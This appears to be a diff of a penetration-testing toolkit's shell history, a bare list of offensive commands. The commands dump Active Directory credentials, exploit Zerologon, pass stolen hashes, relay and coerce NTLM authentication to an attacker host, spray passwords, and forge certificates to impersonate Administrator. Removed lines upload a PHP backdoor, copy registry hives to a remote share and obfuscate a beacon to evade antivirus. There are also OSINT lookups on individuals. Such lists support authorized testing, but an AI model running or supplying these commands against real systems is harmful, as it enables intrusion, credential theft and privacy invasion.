@@ -133,7 +133,6 @@ dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" -r "EXEGOL-01.$DOMAIN" -d 192.16
 privexchange.py -u "$USER" -p "$PASSWORD" -ah "EXEGOL-01.$DOMAIN" EXCHANGE."$DOMAIN" -d "$DOMAIN"
 krbrelayx.py --krbpass "$PASSWORD" --krbsalt DOMAIN.LOCALSV01 -t ldap://"$DC_HOST" --escalate-user "$USER"
 pypykatz lsa minidump lsass.dmp
-enyx 1 public 192.168.10.10
 fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt file.zip
 ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.machine.org' -u "http://$TARGET/"
 ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.org' -u "http://$TARGET/"
@@ -146,13 +145,8 @@ cme smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
 cme smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
 enum4linux-ng -A -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"
 enum4linux-ng -A "$TARGET"
-nmap -sS -p 3268,3269 192.168.56.0/24
-nmap -sC -sV -p 139,445,80,21 192.168.56.201
-nmap -Pn -v -sS -F 192.168.56.0/24
-curl "$TARGET" --upload-file backdoor.php -v
 net rpc password 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
 net rpc user add 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
-pth-net rpc password 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%'ffffffffffffffffffffffffffffffff':"$NT_HASH" -S "$DC_HOST"
 zerologon-scan DC01 "$DC_HOST"
 secretsdump -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
 secretsdump -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
@@ -160,21 +154,13 @@ secretsdump -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccoun
 secretsdump -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 "$DOMAIN"/Administrator@"$DC_HOST"
 zerologon-restore "$DOMAIN"/dc01@"$DC_HOST" -target-ip "$TARGET" -hexpass "69762...6945d"
 nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p 443 mx.example.com
-ruler -k -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -e "j.doe@example.com" --verbose abk dump -o emails.txt
-ruler -k -d "$DOMAIN" brute --users owa-valid-users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a spray-results.txt
 nmap -sS -n --open -p 88 192.168.56.0/24
 windapsearch --dc "$DC_HOST" --module metadata
 windapsearch --dc "$DC_HOST" --module users
 nmap --script broadcast-dhcp-discover
-SimplyEmail -all -e cybersyndicates.com
 ssh-keygen -t rsa -b 4096 -f keyname
 hashcat --username --hash-type 0 --attack-mode 0 MD5_hashes.txt `fzf-wordlists`
-rbcd.py t-delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
-rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
-rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
 xfreerdp /d:"$DOMAIN" /u:"$USER" /pth:"$NT_HASH" /v:"$TARGET" /cert-ignore
-darkarmour -f /data/beacon.exe --encrypt xor --jmp --loop 7 -o /data/legit.exe
-amber -f beacon.exe
 hcxdumptool -I
 hcxdumptool -i wlan1 -o dump.pcapng --active_beacon --enable_status=1
 hcxpcapngtool -o dump.hashcat dump.pcapng
@@ -194,34 +180,19 @@ holehe test@gmail.com
 theHarvester.py -d "$DOMAIN" -g -s -r -f "$DOMAIN.xml" -b all
 infoga.py -d "$DOMAIN" -s all -b -r "$DOMAIN.txt" -v 2
 h8mail -t test@gmail.com
-phoneinfoga scan -n 33123456789
 maigret "username"
-linkedin2username.py -u myname@email.com -c uber-com
 toutatis.py -s SESSIONID -u starbucks
-twint -u username --since '2015-12-20 20:30:15'
-twint -g='48.880048,2.385939,1km' -o file.csv --csv
 ipinfo 1.1.1.1
 onionsearch 'computer'
 onionsearch 'computer' --engines tor66 deeplink phobos --limit 3
 waybackurls test.com
-github-email ghusername
-WikiLeaker google.com
 tiktok-scraper user USERNAME -d -n 100
-buster -e 'j********9@g****.com' -f john -l doe -b '****1989'
 cloudfail.py --target seo.com --tor
 assetfinder google.com
 subfinder -d freelancer.com
 theHarvester -d github.com -b all
 nfc-scan-device -v
 nfc-list
-mfoc -O original.dmp
-mfoc -O magic-gen1.dmp
-mfdread original.dmp
-nfc-mfclassic W A B original.dmp magic-gen1.dmp
-libnfc_crypto1_crack a0a1a2a3a4a5 0 A 4 B
-mfoc -O original.dmp -k keys.txt
-nrf24-scanner.py -l -v
-jackit --reset --debug
 secretsdump -ntds ntds.dit.save -system system.save LOCAL
 gosecretsdump -ntds ntds.dit.save -system system.save
 screen /dev/ttyACM0 115200
@@ -240,11 +211,6 @@ ntlm-scanner -vuln CVE-2019-1019 -target "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST
 ntlm-scanner -vuln CVE-2019-1338 -target "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 ntlm-scanner -vuln CVE-2019-1166 -target "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 ntlm-scanner -vuln CVE-2019-1040 -target "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
-das add -db dbname masscan '-e eth0 --rate 1000 -iL hosts.txt --open -p1-65535'
-das add -db dbname rustscan '-b 1000 -t 2000 -u 5000 -a hosts.txt -r 1-65535 -g --no-config --scan-order "Random"'
-das scan -db dbname -hosts all -oA report1 -nmap '-Pn -sVC -O' -parallel
-das scan -db dbname -ports 22,80,443,445 -show
-das report -hosts 192.168.1.0/24 -oA report2
 hashcat --status --hash-type 2100 --attack-mode 0 '$DCC2$10240#user#bb38628253e7681553b72e7da3adf305' `fzf-wordlists`
 pypykatz kerberos tgt "kerberos+rc4://$DOMAIN\\$USER:$NT_HASH@$DOMAIN"
 ms14-068.py -u "$USER"@"$DOMAIN" --rc4 "$NT_HASH" -s "$DOMAIN_SID" -d "$DC_HOST"
@@ -278,30 +244,20 @@ DonPAPI.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 webclientservicescanner -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 ntlmrelayx -t "http://pki.$DOMAIN/certsrv/certfnsh.asp" --adcs
 echo '8.8.8.8' | hakrevdns
-prips 192.168.0.0 192.168.0.255
-prips -i4 192.168.0.10 192.168.0.250
-prips 173.0.84.0/24 | hakrevdns
-nuclei -u https://example.com
 httpx -probe -list hosts.txt -tech-detect -status-code -fr
-prips 192.168.56.0/24|hakrevdns -d|httpx -probe -tech-detect -status-code -fr
 ntpdate -u "$TARGET"
 renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip dc01 "$DOMAIN"/"$USER":"$PASSWORD"
 getTGT.py -dc-ip dc01 "$DOMAIN"/'DC01':'123pentest'
 renameMachine.py -current-name 'DC01' -new-name 'testcomputer$' -dc-ip dc01 "$DOMAIN"/"$USER":"$PASSWORD"
 KRB5CCNAME='DC01.ccache' getST.py -self -impersonate 'domainadmin' -k -no-pass -dc-ip dc01 "$DOMAIN"/"$DC_HOST"
 KRB5CCNAME='domainadmin.ccache' secretsdump -just-dc-user 'krbtgt' -dc-ip dc01 -k -no-pass @"$DC_HOST"
-pwndb --target @example.com --output txt
-robotstester -u http://www.example.com/ -L
 shadowcoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$TARGET"
 faketime '2022-01-31 22:05:35' zsh
 manspider --threads 50 192.168.56.0/24 -d "$DOMAIN" -u "$USER" -H "$NT_HASH" --content administrateur
 gMSADumper.py -d "$DOMAIN" -l "$DC_HOST" -u "$USER" -p "$PASSWORD"
 modifyCertTemplate.py -template KerberosAuthentication -get-acl "$DOMAIN"/"$USER":"$PASSWORD"
 smbserver.py -smb2support SHUTDOWN .
-reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SAM' -o '\\192.168.56.1\SHUTDOWN'
-reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\SHUTDOWN'
-reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\SHUTDOWN'
-reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" backup -o '\\192.168.56.1\SHUTDOWN'
+
 secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 pyLAPS.py --action get -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP"
 FindUncommonShares.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP"
@@ -341,4 +297,35 @@ mysql $IP -u $USER -p
 ffuf -config ~/.ffufrc_domain
 ffuf -config ~/.ffufrc
 rustscan -a $IP -r 20-20000 -- -A -sC -sV > $NAME-scan-1.txt
+sudo impacket-smbserver share . -smb2support
+cme winrm $IP -u $USER -p $PASSWORD -x 'whoami'
+evil-winrm -u "$USER" -i "$IP"
+sqlmap -r request.req --risk=3 --level=5 --dbms
+impacket-mssqlclient $DOMAIN/$USER@$IP
+cme smb $IP -u 'guest' -p '' --rid-brute
+enum4linux -A "$IP"
+ldapsearch -H ldap://$IP/ -x -s base -b '' "(objectClass=*)" "*" +
+sudo nmap -sU --min-rate 10000 -oA nmap/udp $IP -v
+cme mssql $IP -u user.txt -p pass.txt
+./kerbrute userenum --dc $DC -d "$DOMAIN" user.txt
+smbclient --user '' -L \\$IP\\\\
+impacket-smbclient $DOMAIN@$IP
+smbclient -U '' //$IP/
+cme smb $IP -u $USER -p $PASSWORD 
+.\Certify.exe find /vulnerable
+.\Certify.exe request /ca:dc.test.htb\test-DC-CA /template:UserAuthentication /altname:Administrator
+openssl pkcs12 -in cert.pem -inkey priv.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+certipy auth -pfx "cert.pfx" -username administrator -domain $DOMAIN -dc-ip $IP
+rlwrap -cAr nc -lvnp $PORT
+ssh $USER@$DOMAIN 
+ssh $USER@$IP
+scp chisel -i id_rsa $USER@$DOMAIN:/dev/shm/chisel
+scp pspy64 -i id_rsa $USER@$DOMAIN:/dev/shm/psi
+sqlmap -u "http://localhost:8081/?id=" --risk 3 --level 5
+hashcat -m 0 hash.txt rockyou.txt
+ffuf -request REQUESTFILE -request-proto http -w PATH/TO/WORDLIST -fs 0 -c
+netdiscover -i INTERFACE_NAME -r IP_RANGE/CIDR -p
+sudo nmap -sU --min-rate 10000 --reason IP
+snmpwalk -v2c -c COMMUNITYSTRING IP
+python3 snmp-brute.py -t IP -f WORDLIST
 
